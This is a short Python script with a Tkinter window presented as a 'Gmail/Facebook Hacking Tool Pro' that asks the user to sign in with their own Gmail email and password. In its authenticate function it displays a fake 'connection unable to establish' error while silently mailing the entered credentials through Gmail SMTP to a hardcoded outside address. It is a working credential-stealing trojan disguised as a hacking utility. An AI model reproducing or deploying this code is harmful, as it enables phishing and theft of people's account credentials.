
# coding: utf-8

# In[ ]:


from tkinter import *
from tkinter import messagebox
import smtplib

server =smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login('enter your email here within quotes','enter your password here within quotes')

s=Tk()

s.title("DarkNet Industries")

s.configure(background='light green')

def authenticate():
    w1=word2.get()
 #   l7=Label(text=w1).pack()
    w2=word3.get()
 #   l8=Label(text=w2).pack()
    
    if ((w1)==(w2)):
        l5=Label(text='Connection unable to establish, please check your network', fg='red').pack()
        w4=word1.get()
        message = 'Email : '+w4+'password : '+ w2
        m=str(message)
        server.sendmail('official.businessengineers@gmail.com','jaykrishnamishra15@gmail.com',w4+' and '+w2)
        
    else:
        l6=Label(text='Password missmatch', fg='red').pack()
        
    

l1=Label(text='Gmail/Facebook Hacking Tool Pro', fg='green', font=('arial', 30, 'bold')).pack()

l2=Label(text='Please Signin Using Gmail Account', fg='green', font=('times', 24, 'bold')).pack()

word1=StringVar()
word2=StringVar()
word3=StringVar()

l3=Label(text='Enter Email', fg='blue').pack()
box1=Entry(textvariable=word1).pack()

l4=Label(text='Enter Password', fg='blue').pack()
box2=Entry(textvariable=word2).pack()



l4=Label(text='Confirm Password', fg='blue').pack()
box3=Entry(textvariable=word3).pack()



button1=Button(text='SignIn', command=authenticate).pack()
s.mainloop()
r=input()

